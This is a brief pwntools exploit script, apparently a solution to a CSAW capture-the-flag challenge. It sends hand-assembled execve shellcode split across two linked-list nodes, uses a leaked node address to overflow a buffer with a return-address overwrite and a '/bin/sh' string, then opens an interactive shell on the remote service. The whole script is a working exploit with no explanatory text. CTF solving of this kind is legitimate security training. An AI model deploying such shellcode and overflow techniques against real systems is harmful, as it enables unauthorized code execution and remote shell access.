from pwn import *

r = remote('pwn.chal.csaw.io', 9005)

r.sendlineafter('node 1:',
    '\x48\x89\xe7'  # mov  %rsp,%rdi
    '\x31\xf6'      # xor  %esi,%esi
    '\xeb\xdb'      # jmp  node 2
)
r.sendlineafter('node 2:',
    'AA'            # (overwritten later)
    '\x99'          # cdq
    '\xb0\x3b'      # mov  $0x3b,%al
    '\x0f\x05'      # syscall
)

r.recvuntil('node.next: ')
addr = int(r.recvline(), 16) + 0x28

r.sendlineafter('initials?', 'A' * 0xb + p64(addr) + '/bin/sh\x00')

r.interactive()
